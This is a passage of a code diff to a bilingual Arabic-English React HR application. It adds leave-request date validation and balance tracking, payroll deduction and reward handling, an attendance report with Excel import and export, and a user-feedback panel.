+        return `${String(year).padStart(4, "0")}-${String(month).padStart(2, "0")}-${String(day).padStart(2, "0")}`;
+      }
+    }
+
+    return "";
+  };
+
+  const isValidNormalizedLeaveDate = (value) => {
+    if (!value) return false;
+    const [yearText, monthText, dayText] = String(value).split("-");
+    const year = Number(yearText);
+    const month = Number(monthText);
+    const day = Number(dayText);
+    if (!year || !month || !day) return false;
+    if (year < 1900 || year > 2100) return false;
+    const candidate = new Date(Date.UTC(year, month - 1, day));
+    return (
+      candidate.getUTCFullYear() === year &&
+      candidate.getUTCMonth() === month - 1 &&
+      candidate.getUTCDate() === day
+    );
+  };
+
+  const getApprovedLeaveDays = (request) => {
+    if (!request || request.type !== "إجازة") return 0;
+    const fromValue = normalizeLeaveDateValue(request.leaveFrom);
+    const toValue = normalizeLeaveDateValue(request.leaveTo);
+    if (!isValidNormalizedLeaveDate(fromValue) || !isValidNormalizedLeaveDate(toValue)) return 0;
+    const start = new Date(`${fromValue}T00:00:00`);
+    const end = new Date(`${toValue}T00:00:00`);
+    if (Number.isNaN(start.getTime()) || Number.isNaN(end.getTime()) || end < start) return 0;
+    const diffMs = end.getTime() - start.getTime();
+    const diffDays = Math.floor(diffMs / 86400000) + 1;
+    return Math.max(0, diffDays);
+  };
+
+  useEffect(() => {
+    const requestsNeedingGuard = requests.filter(
+      (req) => req.type === "إجازة" && req.status === "معتمد" && req.leaveBalanceApplied && Number(req.leaveDaysApproved || 0) <= 0
+    );
+
+    if (!requestsNeedingGuard.length) return;
+
+    let changed = false;
+    const nextRequests = requests.map((req) => {
+      const normalizedFrom = normalizeLeaveDateValue(req.leaveFrom);
+      const normalizedTo = normalizeLeaveDateValue(req.leaveTo);
+      if (req.type !== "إجازة" || req.status !== "معتمد" || !req.leaveBalanceApplied || Number(req.leaveDaysApproved || 0) > 0) {
+        return req;
+      }
+      if (!normalizedFrom || !normalizedTo) {
+        changed = true;
+        return {
+          ...req,
+          leaveBalanceApplied: false,
+          leaveDaysApproved: 0,
+        };
+      }
+      return req;
+    });
+
+    if (changed) {
+      setRequests(nextRequests);
+    }
+  }, [requests]);
+
+  useEffect(() => {
+    const refundableRequests = requests.filter(
+      (req) =>
+        req.type === "إجازة" &&
+        req.status === "معتمد" &&
+        req.leaveBalanceApplied &&
+        Number(req.leaveDaysApproved || 0) > 0 &&
+        (!normalizeLeaveDateValue(req.leaveFrom) || !normalizeLeaveDateValue(req.leaveTo)) &&
+        !req.leaveBalanceRefunded
+    );
+
+    if (!refundableRequests.length) return;
+
+    let changed = false;
+    const nextEmployees = employees.map((emp) => ({ ...emp }));
+    const nextRequests = requests.map((req) => ({ ...req }));
+
+    refundableRequests.forEach((req) => {
+      const empIndex = nextEmployees.findIndex((emp) => emp.phone === req.employeePhone);
+      const reqIndex = nextRequests.findIndex((item) => item.id === req.id);
+      if (reqIndex === -1) return;
+
+      nextRequests[reqIndex] = {
+        ...nextRequests[reqIndex],
+        leaveBalanceApplied: false,
+        leaveBalanceRefunded: true,
+        leaveDaysApproved: 0,
+      };
+
+      if (empIndex !== -1) {
+        nextEmployees[empIndex] = {
+          ...nextEmployees[empIndex],
+          leaveBalance: Number(nextEmployees[empIndex].leaveBalance || 0) + Number(req.leaveDaysApproved || 0),
+        };
+      }
+      changed = true;
+    });
+
+    if (changed) {
+      setEmployees(nextEmployees);
+      setRequests(nextRequests);
+    }
+  }, [requests, employees]);
+
   const updateRequestStatus = async (id, status) => {
     if (!authUser) return;
 
+    const targetRequest = requests.find((r) => r.id === id) || null;
+    if (!targetRequest || targetRequest.canDecide === false) return;
+
+    if (status === "معتمد" && targetRequest.type === "إجازة") {
+      const overlap = getOverlappingLeaveRequests(
+        targetRequest.employeePhone,
+        targetRequest.leaveFrom,
+        targetRequest.leaveTo,
+        { excludeId: targetRequest.id, includePending: false }
+      );
+      if (overlap.length) {
+        const latestOverlap = overlap[0];
+        window.alert(
+          language === "ar"
+            ? `لا يمكن اعتماد هذه الإجازة لأن هناك إجازة معتمدة متداخلة لنفس الموظف من ${normalizeLeaveDateValue(latestOverlap.leaveFrom)} إلى ${normalizeLeaveDateValue(latestOverlap.leaveTo || latestOverlap.leaveFrom)}.`
+            : `This leave request overlaps with another approved leave for the same employee.`
+        );
+        return;
+      }
+    }
+
     let approvedAdvance = null;
-    let approvedDeduction = null;
 
     const updatedRequests = requests.map((r) => {
       if (r.id !== id || r.canDecide === false) return r;
-      const next = { ...r, status, decidedBy: authUser.name, approvedBy: authUser.name, canDecide: false };
+      const leaveDays = status === "معتمد" && r.type === "إجازة" ? getApprovedLeaveDays({ ...r, leaveFrom: normalizeLeaveDateValue(r.leaveFrom), leaveTo: normalizeLeaveDateValue(r.leaveTo) }) : 0;
+      const next = {
+        ...r,
+        status,
+        decidedBy: authUser.name,
+        approvedBy: authUser.name,
+        canDecide: false,
+        decidedAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+        leaveDaysApproved: leaveDays,
+        leaveBalanceApplied: status === "معتمد" && r.type === "إجازة",
+      };
       if (status === "معتمد" && r.type === "سلفة") approvedAdvance = next;
-      if (status === "معتمد" && r.type === "خصم") approvedDeduction = next;
       return next;
     });
 
@@ -3232,10 +5007,11 @@ useEffect(() => {
       );
     }
 
-    if (approvedDeduction) {
+    const approvedLeaveRequest = updatedRequests.find((r) => r.id === id && r.type === "إجازة" && r.status === "معتمد");
+    if (approvedLeaveRequest && approvedLeaveRequest.leaveDaysApproved > 0) {
       updatedEmployees = updatedEmployees.map((emp) =>
-        emp.phone === approvedDeduction.employeePhone
-          ? { ...emp, advance: Math.max(0, Number(emp.advance || 0) - Number(approvedDeduction.amount || 0)) }
+        emp.phone === approvedLeaveRequest.employeePhone
+          ? { ...emp, leaveBalance: Math.max(0, Number(emp.leaveBalance || 0) - Number(approvedLeaveRequest.leaveDaysApproved || 0)) }
           : emp
       );
     }
@@ -3254,12 +5030,36 @@ useEffect(() => {
       complaints,
       chats,
       chatCalls,
+      feedback: feedbackEntries,
     });
   };
 
   const submitLeaveRequest = async () => {
     const employee = getFinancialRowEmployee() || getCurrentEmployee();
     if (!employee || !leaveRequestForm.reason) return;
+
+    if (leaveRequestForm.type === "إجازة") {
+      const normalizedFrom = normalizeLeaveDateValue(leaveRequestForm.leaveFrom);
+      const normalizedTo = normalizeLeaveDateValue(leaveRequestForm.leaveTo || leaveRequestForm.leaveFrom);
+      if (!normalizedFrom || !normalizedTo) {
+        window.alert(language === "ar" ? "يرجى إدخال تاريخ بداية ونهاية صحيحين للإجازة." : "Please enter valid leave dates.");
+        return;
+      }
+      if (normalizedTo < normalizedFrom) {
+        window.alert(language === "ar" ? "تاريخ نهاية الإجازة يجب أن يكون بعد أو مساويًا لتاريخ البداية." : "Leave end date must be on or after the start date.");
+        return;
+      }
+      const overlap = getOverlappingLeaveRequests(employee.phone, normalizedFrom, normalizedTo, { includePending: true });
+      if (overlap.length) {
+        const latestOverlap = overlap[0];
+        window.alert(
+          language === "ar"
+            ? `يوجد طلب إجازة متداخل لهذا الموظف من ${normalizeLeaveDateValue(latestOverlap.leaveFrom)} إلى ${normalizeLeaveDateValue(latestOverlap.leaveTo || latestOverlap.leaveFrom)}.`
+            : "There is an overlapping leave request for this employee."
+        );
+        return;
+      }
+    }
 
     const newRequest = {
       id: Date.now(),
@@ -3268,8 +5068,8 @@ useEffect(() => {
       department: employee.department,
       managerDepartment: employee.managerDepartment,
       type: leaveRequestForm.type,
-      leaveFrom: leaveRequestForm.type === "إجازة" ? leaveRequestForm.leaveFrom : "",
-      leaveTo: leaveRequestForm.type === "إجازة" ? leaveRequestForm.leaveTo : "",
+      leaveFrom: leaveRequestForm.type === "إجازة" ? normalizeLeaveDateValue(leaveRequestForm.leaveFrom) : "",
+      leaveTo: leaveRequestForm.type === "إجازة" ? normalizeLeaveDateValue(leaveRequestForm.leaveTo) : "",
       lateFrom: leaveRequestForm.type === "تأخير" ? leaveRequestForm.lateFrom : "",
       lateTo: leaveRequestForm.type === "تأخير" ? leaveRequestForm.lateTo : "",
       compensateAt: leaveRequestForm.type === "تأخير" ? leaveRequestForm.compensateAt : "",
@@ -3294,6 +5094,7 @@ useEffect(() => {
       complaints,
       chats,
       chatCalls,
+      feedback: feedbackEntries,
     });
 
     setLeaveRequestDialogOpen(false);
@@ -3333,6 +5134,12 @@ useEffect(() => {
     if (!employee || !rewardRequestForm.amount || !rewardRequestForm.reason) return;
 
     const actionType = canManageAll ? rewardRequestForm.actionType || "مكافأة" : "مكافأة";
+    const valueType = actionType === "خصم" ? (rewardRequestForm.valueType || "amount") : "amount";
+    const rawAmount = Number(rewardRequestForm.amount || 0);
+    const resolvedAmount = valueType === "percentage"
+      ? Math.max(0, Number(employee.salary || employee.basicSalary || 0) * rawAmount / 100)
+      : rawAmount;
+
     const newRequest = {
       id: Date.now(),
       employeePhone: employee.phone,
@@ -3340,7 +5147,12 @@ useEffect(() => {
       department: employee.department,
       managerDepartment: employee.managerDepartment,
       type: actionType,
-      amount: Number(rewardRequestForm.amount || 0),
+      amount: valueType === "percentage" ? rawAmount : resolvedAmount,
+      percentage: valueType === "percentage" ? rawAmount : 0,
+      valueType,
+      resolvedAmount,
+      deductionMode: actionType === "خصم" ? (rewardRequestForm.deductionMode || "manual") : "manual",
+      pendingPayroll: canManageAll,
       reason: rewardRequestForm.reason,
       status: canManageAll ? "معتمد" : "بانتظار الاعتماد",
       approver: "HR / المالك",
@@ -3351,7 +5163,6 @@ useEffect(() => {
     };
 
     setRequests((prev) => [newRequest, ...prev]);
-    if (canManageAll && actionType === "خصم") applyFinancialRequestEffect(newRequest);
 
     setRewardDialogOpen(false);
     setRewardRequestForm(emptyRewardRequestForm);
@@ -3362,11 +5173,29 @@ useEffect(() => {
     if (!employee || !salaryDepositForm.salaryAmount) return;
 
     const salaryAmount = Number(salaryDepositForm.salaryAmount || 0);
-    const deductionAmount = Number(salaryDepositForm.deductionAmount || 0);
-    const netAmount = Math.max(0, salaryAmount - deductionAmount);
+    const manualDeductionAmount = Number(salaryDepositForm.deductionAmount || 0);
+    const pendingRequests = requests.filter((req) =>
+      req.employeePhone === employee.phone &&
+      req.status === "معتمد" &&
+      !req.appliedToSalaryDepositId &&
+      ["مكافأة", "خصم"].includes(req.type)
+    );
+
+    const rewardAmount = pendingRequests
+      .filter((req) => req.type === "مكافأة")
+      .reduce((sum, req) => sum + getRequestResolvedAmount(req, salaryAmount), 0);
+
+    const payrollDeductionAmount = pendingRequests
+      .filter((req) => req.type === "خصم")
+      .reduce((sum, req) => sum + getRequestResolvedAmount(req, salaryAmount), 0);
+
+    const advanceDeduction = getAdvanceDeductionDetails(employee, salaryAmount);
+    const totalDeductionAmount = payrollDeductionAmount + manualDeductionAmount;
+    const netAmount = Math.max(0, salaryAmount - advanceDeduction.amount + rewardAmount - totalDeductionAmount);
+    const salaryDepositId = Date.now();
 
     const newRequest = {
-      id: Date.now(),
+      id: salaryDepositId,
       employeePhone: employee.phone,
       employeeName: employee.name,
       department: employee.department,
@@ -3374,7 +5203,13 @@ useEffect(() => {
       type: "إنزال مرتب",
       amount: netAmount,
       salaryAmount,
-      deductionAmount,
+      rewardAmount,
+      deductionAmount: totalDeductionAmount,
+      payrollDeductionAmount,
+      manualDeductionAmount,
+      advanceSettledAmount: advanceDeduction.amount,
+      advanceDeductionMode: advanceDeduction.mode,
+      advanceDeductionValueType: advanceDeduction.valueType,
       month: salaryDepositForm.month || "",
       reason: salaryDepositForm.deductionReason || "-",
       status: "معتمد",
@@ -3385,7 +5220,35 @@ useEffect(() => {
       createdAt: new Date().toISOString(),
     };
 
-    setRequests((prev) => [newRequest, ...prev]);
+    const updatedRequests = [newRequest, ...requests].map((req) => {
+      if (
+        req.employeePhone === employee.phone &&
+        req.status === "معتمد" &&
+        !req.appliedToSalaryDepositId &&
+        ["مكافأة", "خصم"].includes(req.type)
+      ) {
+        return {
+          ...req,
+          appliedToSalaryDepositId: salaryDepositId,
+          pendingPayroll: false,
+          resolvedAmount: getRequestResolvedAmount(req, salaryAmount),
+        };
+      }
+      return req;
+    });
+
+    const updatedEmployees = employees.map((emp) =>
+      emp.phone === employee.phone
+        ? {
+            ...emp,
+            salary: salaryAmount,
+            advance: Math.max(0, Number(emp.advance || 0) - advanceDeduction.amount),
+          }
+        : emp
+    );
+
+    setRequests(updatedRequests);
+    setEmployees(updatedEmployees);
     setSalaryDepositDialogOpen(false);
     setSalaryDepositForm(emptySalaryDepositForm);
   };
@@ -3401,12 +5264,36 @@ useEffect(() => {
             </div>
 
             <div style={{ ...ui.grid2, ...(isMobileView ? ui.grid2Mobile : {}) }}>
-              <Field label={t.name}><Input value={registerForm.name} onChange={(e) => setRegisterForm((p) => ({ ...p, name: e.target.value }))} /></Field>
-              <Field label={t.phone}><Input value={registerForm.phone} onChange={(e) => setRegisterForm((p) => ({ ...p, phone: e.target.value }))} /></Field>
-              <Field label={t.password}><Input type="password" value={registerForm.password} onChange={(e) => setRegisterForm((p) => ({ ...p, password: e.target.value }))} /></Field>
-              <Field label={t.department}><Input value={registerForm.department} onChange={(e) => setRegisterForm((p) => ({ ...p, department: e.target.value }))} /></Field>
-              <Field label={t.managerDepartment}><Input value={registerForm.managerDepartment} onChange={(e) => setRegisterForm((p) => ({ ...p, managerDepartment: e.target.value }))} /></Field>
-              <Field label={t.location}><Input value={registerForm.location} onChange={(e) => setRegisterForm((p) => ({ ...p, location: e.target.value }))} /></Field>
+              <Field label={t.name}>
+                <Input value={registerForm.name} onChange={(e) => setRegisterForm((p) => ({ ...p, name: e.target.value }))} />
+              </Field>
+              <Field label={t.phone}>
+                <Input value={registerForm.phone} onChange={(e) => setRegisterForm((p) => ({ ...p, phone: e.target.value }))} />
+              </Field>
+              <Field label={t.password}>
+                <Input type="password" value={registerForm.password} onChange={(e) => setRegisterForm((p) => ({ ...p, password: e.target.value }))} />
+              </Field>
+              <Field label={t.department}>
+                <Input value={registerForm.department} onChange={(e) => setRegisterForm((p) => ({ ...p, department: e.target.value }))} />
+              </Field>
+              <Field label={t.email}>
+                <Input
+                  type="email"
+                  value={registerForm.email || ""}
+                  onChange={(e) => setRegisterForm((p) => ({ ...p, email: e.target.value }))}
+                />
+              </Field>
+              <Field label={t.location}>
+                <Select
+                  value={registerForm.location}
+                  onChange={(e) => setRegisterForm((p) => ({ ...p, location: e.target.value }))}
+                >
+                  <option value="">{t.selectBranch || "اختر الفرع"}</option>
+                  {branchOptions.map((branch) => (
+                    <option key={branch} value={branch}>{branch}</option>
+                  ))}
+                </Select>
+              </Field>
             </div>
 
             {registerMessage ? <p style={ui.errorText}>{registerMessage}</p> : null}
@@ -3423,7 +5310,7 @@ useEffect(() => {
     return (
       <div style={ui.centerPage}>
         <Card style={{ ...ui.authCard, maxWidth: 560 }}>
-          <div style={ui.phoneWrap}><Phone size={28} /></div>
+          <div style={ui.phoneWrap}><img src={BRAND_ASSETS.logo} alt={BRAND_ASSETS.name} style={ui.brandLogoAuth} /></div>
 
           <div style={ui.authHead}>
             <h1 style={ui.bigTitle}>{t.loginTitle}</h1>
@@ -3458,7 +5345,7 @@ useEffect(() => {
       <Card style={{ ...ui.heroCard, ...(isMobileView ? ui.heroCardMobile : {}) }}>
         <div style={{ ...ui.heroRow, ...(isMobileView ? ui.heroRowMobile : {}) }}>
           <div style={{ flex: 1, minWidth: isMobileView ? 0 : 300 }}>
-            <div style={ui.heroBadge}><Sparkles size={14} /> {t.heroBadge}</div>
+            <div style={ui.heroBadge}><img src={BRAND_ASSETS.logo} alt={BRAND_ASSETS.name} style={ui.brandLogoBadge} /> {t.heroBadge}</div>
             <h1 style={{ ...ui.heroTitle, ...(isMobileView ? ui.heroTitleMobile : {}) }}>{t.appTitle}</h1>
             <p style={{ ...ui.heroDesc, ...(isMobileView ? ui.heroDescMobile : {}) }}>
               {canManageAll
@@ -3513,12 +5400,24 @@ useEffect(() => {
         }}
       />
 
+      <button
+        type="button"
+        title={language === "ar" ? "تقييم التطبيق" : "Rate the app"}
+        onClick={() => {
+          setFeedbackMessage("");
+          setFeedbackWidgetOpen(true);
+        }}
+        style={ui.feedbackFloatingButton}
+      >
+        <Star size={18} />
+      </button>
+
       {sidebarOpen && (
         <div style={ui.sidebarOverlay} onClick={() => setSidebarOpen(false)}>
           <aside style={ui.sidebarPanel} onClick={(e) => e.stopPropagation()}><div style={ui.sidebarGlowTop} /><div style={ui.sidebarGlowBottom} />
             <div style={ui.sidebarTop}>
               <div>
-                <div style={ui.sidebarBrand}>{language === "ar" ? "لوحة التحكم" : "Control Panel"}</div>
+                <div style={ui.sidebarBrand}>{language === "ar" ? BRAND_ASSETS.sidebarLabelAr : BRAND_ASSETS.sidebarLabelEn}</div>
                 <div style={ui.sidebarSubbrand}>{authUser?.name || t.appTitle}</div>
               </div>
               <button onClick={() => setSidebarOpen(false)} style={ui.sidebarCloseButton}><X size={18} /></button>
@@ -3582,6 +5481,21 @@ useEffect(() => {
                     )}
                   </button>
 
+                  {isProgrammerUser && (
+                    <button style={{ ...ui.sidebarItem, ...(activeTab === "programmerFeedback" ? ui.sidebarItemActive : {}) }} onClick={() => openSidebarTab("programmerFeedback")}>
+                      <span style={ui.sidebarItemIcon}><Star size={18} /></span>
+                      <span style={ui.sidebarItemText}>{language === "ar" ? "تقييمات المستخدمين" : "User Feedback"}</span>
+                      {visibleFeedbackEntries.length > 0 && (
+                        <span style={ui.sidebarNotifBadge}>{visibleFeedbackEntries.length > 99 ? "99+" : visibleFeedbackEntries.length}</span>
+                      )}
+                    </button>
+                  )}
+
+                  <button style={{ ...ui.sidebarItem, ...(activeTab === "attendanceReport" ? ui.sidebarItemActive : {}) }} onClick={() => openSidebarTab("attendanceReport")}>
+                    <span style={ui.sidebarItemIcon}><Fingerprint size={18} /></span>
+                    <span style={ui.sidebarItemText}>{language === "ar" ? "تقرير البصمة" : "Attendance Report"}</span>
+                  </button>
+
                   <button style={{ ...ui.sidebarItem, ...(activeTab === "chat" ? ui.sidebarItemActive : {}) }} onClick={() => openSidebarTab("chat")}>
                     <span style={ui.sidebarItemIcon}><MessageCircle size={18} /></span>
                     <span style={ui.sidebarItemText}>{t.chatTab}</span>
@@ -3606,6 +5520,253 @@ useEffect(() => {
       </div>
 
       
+
+      {activeTab === "programmerFeedback" && isProgrammerUser && (
+        <Card>
+          <SectionHeader
+            isMobile={isMobileView}
+            icon={Star}
+            title={language === "ar" ? "تقييمات المستخدمين" : "User Feedback"}
+            description={language === "ar" ? "هذه الرسائل تصل فقط إلى حساب مبرمجR1 مع التقييم النصي والنجوم." : "These messages are only visible to Programmer R1 with ratings and written feedback."}
+          />
+
+          {!visibleFeedbackEntries.length ? (
+            <div style={{ ...ui.emptyState, textAlign: "center" }}>{language === "ar" ? "لا توجد تقييمات حتى الآن" : "No feedback yet."}</div>
+          ) : isMobileView ? (
+            <div style={ui.mobileCardsStack}>
+              {visibleFeedbackEntries.map((item) => (
+                <MobileDataCard key={item.id} title={`${item.senderName} - ${"★".repeat(Number(item.rating || 0))}`}>
+                  <MobileFieldRow label={language === "ar" ? "المرسل" : "Sender"} value={item.senderPhone || "-"} />
+                  <MobileFieldRow label={language === "ar" ? "التاريخ" : "Date"} value={item.createdAt ? new Date(item.createdAt).toLocaleString(language === "ar" ? "ar-EG" : "en-US") : "-"} />
+                  <MobileFieldRow label={language === "ar" ? "الرأي" : "Feedback"} value={item.message || "-"} accent />
+                </MobileDataCard>
+              ))}
+            </div>
+          ) : (
+            <div style={ui.tableWrap}>
+              <table style={ui.table}>
+                <thead>
+                  <tr>
+                    <th style={ui.th}>{language === "ar" ? "المرسل" : "Sender"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الحساب" : "Account"}</th>
+                    <th style={ui.th}>{language === "ar" ? "التقييم" : "Rating"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الرأي" : "Feedback"}</th>
+                    <th style={ui.th}>{language === "ar" ? "التاريخ" : "Date"}</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {visibleFeedbackEntries.map((item) => (
+                    <tr key={item.id}>
+                      <td style={ui.td}>{item.senderName || "-"}</td>
+                      <td style={ui.td}>{item.senderPhone || "-"}</td>
+                      <td style={ui.td}>{"★".repeat(Number(item.rating || 0)) || "-"}</td>
+                      <td style={ui.td}>{item.message || "-"}</td>
+                      <td style={ui.td}>{item.createdAt ? new Date(item.createdAt).toLocaleString(language === "ar" ? "ar-EG" : "en-US") : "-"}</td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            </div>
+          )}
+        </Card>
+      )}
+
+      {activeTab === "attendanceReport" && (
+        <Card>
+          <SectionHeader
+            isMobile={isMobileView}
+            icon={Fingerprint}
+            title={language === "ar" ? "تقرير البصمة" : "Attendance Report"}
+            description={language === "ar" ? "متابعة الحضور والانصراف والتأخير مع فلترة حسب التاريخ والموظف وتصدير إلى Excel." : "Track attendance, exit times, and delays with employee/date filters and Excel export."}
+          />
+
+          <div style={{ ...ui.grid2, ...(isMobileView ? ui.grid2Mobile : {}), marginBottom: 18 }}>
+            <Field label={language === "ar" ? "التاريخ" : "Date"}>
+              <div style={{ display: "grid", gap: 8 }}>
+                <Input type="date" value={attendanceDateFilter} onChange={(e) => setAttendanceDateFilter(e.target.value)} />
+                {isEmployee ? (
+                  <Button variant="outline" onClick={() => setAttendanceDateFilter("")} style={ui.smallBtn}>
+                    {language === "ar" ? "عرض كل الأيام" : "Show all days"}
+                  </Button>
+                ) : null}
+              </div>
+            </Field>
+            {!isEmployee ? (
+              <Field label={language === "ar" ? "الموظف" : "Employee"}>
+                <Select value={attendanceEmployeeFilter} onChange={(e) => setAttendanceEmployeeFilter(e.target.value)}>
+                  <option value="all">{language === "ar" ? "كل الموظفين" : "All employees"}</option>
+                  {visibleEmployees.map((emp) => (
+                    <option key={emp.phone} value={emp.phone}>{emp.name}</option>
+                  ))}
+                </Select>
+              </Field>
+            ) : (
+              <Field label={language === "ar" ? "الموظف" : "Employee"}>
+                <Input value={authUser?.name || currentEmployeeRecord?.name || "-"} disabled />
+              </Field>
+            )}
+          </div>
+
+          <div style={{ display: "flex", justifyContent: language === "ar" ? "flex-start" : "flex-end", gap: 10, flexWrap: "wrap", marginBottom: 18 }}>
+            {canManageAll && (
+              <>
+                <input
+                  ref={attendanceUploadInputRef}
+                  type="file"
+                  accept=".xls,.xlsx,.csv,.txt,.html"
+                  onChange={handleAttendanceUploadToSystem}
+                  style={{ display: "none" }}
+                />
+                <Button variant="outline" onClick={openAttendanceUploadPicker}>
+                  <Download size={16} /> {language === "ar" ? "تنزيل التقرير للسستم" : "Upload Report to System"}
+                </Button>
+              </>
+            )}
+            <Button onClick={exportAttendanceReport} disabled={!attendanceRows.length}>
+              <Download size={16} /> {language === "ar" ? "تصدير Excel" : "Export Excel"}
+            </Button>
+          </div>
+
+          {attendanceUploadStatus ? (
+            <div style={{ ...ui.infoBox, marginBottom: 18 }}>{attendanceUploadStatus}</div>
+          ) : null}
+
+          {!attendanceRows.length ? (
+            <div style={{ ...ui.emptyState, textAlign: "center" }}>{attendanceReportEmptyMessage}</div>
+          ) : isMobileView ? (
+            <div style={ui.mobileCardsStack}>
+              {attendanceRows.map((row) => (
+                <MobileDataCard key={row.id} title={row.name} action={!isEmployee ? <Button variant="outline" style={ui.smallBtn} onClick={() => openAttendanceHistoryModal(row)}>{language === "ar" ? "السجل" : "History"}</Button> : null}>
+                  <MobileFieldRow label={language === "ar" ? "الإدارة" : "Department"} value={row.department} />
+                  <MobileFieldRow label={language === "ar" ? "الدخول المجدول" : "Scheduled in"} value={row.scheduledIn} />
+                  <MobileFieldRow label={language === "ar" ? "الخروج المجدول" : "Scheduled out"} value={row.scheduledOut} />
+                  <MobileFieldRow label={language === "ar" ? "الدخول الفعلي" : "Actual in"} value={row.actualIn} />
+                  <MobileFieldRow label={language === "ar" ? "الخروج الفعلي" : "Actual out"} value={row.actualOut} />
+                  <MobileFieldRow label={language === "ar" ? "التأخير" : "Delay"} value={row.delayLabel} accent />
+                  <MobileFieldRow label={language === "ar" ? "الحالة" : "Status"} value={row.status} />
+                </MobileDataCard>
+              ))}
+            </div>
+          ) : (
+            <div style={ui.tableWrap}>
+              <table style={ui.table}>
+                <thead>
+                  <tr>
+                    <th style={ui.th}>{language === "ar" ? "التاريخ" : "Date"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الاسم" : "Name"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الإدارة" : "Department"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الدخول المجدول" : "Scheduled in"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الخروج المجدول" : "Scheduled out"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الدخول الفعلي" : "Actual in"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الخروج الفعلي" : "Actual out"}</th>
+                    <th style={ui.th}>{language === "ar" ? "التأخير" : "Delay"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الحالة" : "Status"}</th>
+                    <th style={ui.th}>{language === "ar" ? "ملاحظة" : "Note"}</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {attendanceRows.map((row) => (
+                    <tr
+                      key={row.id}
+                      onClick={!isEmployee ? () => openAttendanceHistoryModal(row) : undefined}
+                      style={!isEmployee ? { cursor: "pointer" } : undefined}
+                    >
+                      <td style={ui.td}>{row.date || "-"}</td>
+                      <td style={ui.td}>
+                        {!isEmployee ? (
+                          <button
+                            type="button"
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              openAttendanceHistoryModal(row);
+                            }}
+                            style={{ background: "transparent", border: "none", padding: 0, color: "inherit", cursor: "pointer", fontWeight: 700, textDecoration: "underline" }}
+                          >
+                            {row.name}
+                          </button>
+                        ) : (
+                          <strong>{row.name}</strong>
+                        )}
+                      </td>
+                      <td style={ui.td}>{row.department}</td>
+                      <td style={ui.td}>{row.scheduledIn}</td>
+                      <td style={ui.td}>{row.scheduledOut}</td>
+                      <td style={ui.td}>{row.actualIn}</td>
+                      <td style={ui.td}>{row.actualOut}</td>
+                      <td style={ui.td}>{row.delayLabel}</td>
+                      <td style={ui.td}>{row.status}</td>
+                      <td style={ui.td}>{row.reason}</td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            </div>
+          )}
+        </Card>
+      )}
+
+      <Modal
+        open={attendanceHistoryModalOpen}
+        title={language === "ar" ? `سجل البصمة - ${attendanceHistoryEmployee?.name || ""}` : `Attendance History - ${attendanceHistoryEmployee?.name || ""}`}
+        onClose={() => { setAttendanceHistoryModalOpen(false); setAttendanceHistoryEmployee(null); setAttendanceHistoryDateFilter(""); }}
+        maxWidth={1100}
+      >
+        <div style={{ display: "grid", gap: 16 }}>
+          <div style={{ ...ui.grid2, ...(isMobileView ? ui.grid2Mobile : {}) }}>
+            <Field label={language === "ar" ? "الموظف" : "Employee"}>
+              <Input value={attendanceHistoryEmployee?.name || "-"} disabled />
+            </Field>
+            <Field label={language === "ar" ? "تصفية حسب يوم" : "Filter by day"}>
+              <div style={{ display: "grid", gap: 8 }}>
+                <Input type="date" value={attendanceHistoryDateFilter} onChange={(e) => setAttendanceHistoryDateFilter(e.target.value)} />
+                <Button variant="outline" style={ui.smallBtn} onClick={() => setAttendanceHistoryDateFilter("")}>
+                  {language === "ar" ? "كل الأيام" : "All days"}
+                </Button>
+              </div>
+            </Field>
+          </div>
+
+          {!attendanceHistoryModalRows.length ? (
+            <div style={{ ...ui.emptyState, textAlign: "center" }}>{language === "ar" ? "لا توجد سجلات بصمة لهذا الموظف" : "No attendance records for this employee."}</div>
+          ) : (
+            <div style={{ ...ui.tableWrap, ...(isMobileView ? ui.tableWrapMobile : {}) }}>
+              <table style={{ ...ui.table, ...(isMobileView ? ui.tableMobile : {}) }}>
+                <thead>
+                  <tr>
+                    <th style={ui.th}>{language === "ar" ? "التاريخ" : "Date"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الإدارة" : "Department"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الدخول المجدول" : "Scheduled in"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الخروج المجدول" : "Scheduled out"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الدخول الفعلي" : "Actual in"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الخروج الفعلي" : "Actual out"}</th>
+                    <th style={ui.th}>{language === "ar" ? "التأخير" : "Delay"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الحالة" : "Status"}</th>
+                    <th style={ui.th}>{language === "ar" ? "ملاحظة" : "Note"}</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {attendanceHistoryModalRows.map((row) => (
+                    <tr key={row.id}>
+                      <td style={ui.td}>{row.date || "-"}</td>
+                      <td style={ui.td}>{row.department}</td>
+                      <td style={ui.td}>{row.scheduledIn}</td>
+                      <td style={ui.td}>{row.scheduledOut}</td>
+                      <td style={ui.td}>{row.actualIn}</td>
+                      <td style={ui.td}>{row.actualOut}</td>
+                      <td style={ui.td}>{row.delayLabel}</td>
+                      <td style={ui.td}>{row.status}</td>
+                      <td style={ui.td}>{row.reason}</td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            </div>
+          )}
+        </div>
+        <div style={{ ...ui.modalActions, ...(isMobileView ? ui.modalActionsMobile : {}) }}>
+          <Button variant="outline" onClick={() => { setAttendanceHistoryModalOpen(false); setAttendanceHistoryEmployee(null); setAttendanceHistoryDateFilter(""); }}>{t.close}</Button>
+        </div>
+      </Modal>
 
       {activeTab === "complaints" && (
         <Card>
@@ -3649,6 +5810,46 @@ useEffect(() => {
             <Field label={t.complaintBody} full>
               <Textarea value={complaintForm.body} onChange={(e) => setComplaintForm((p) => ({ ...p, body: e.target.value }))} />
             </Field>
+
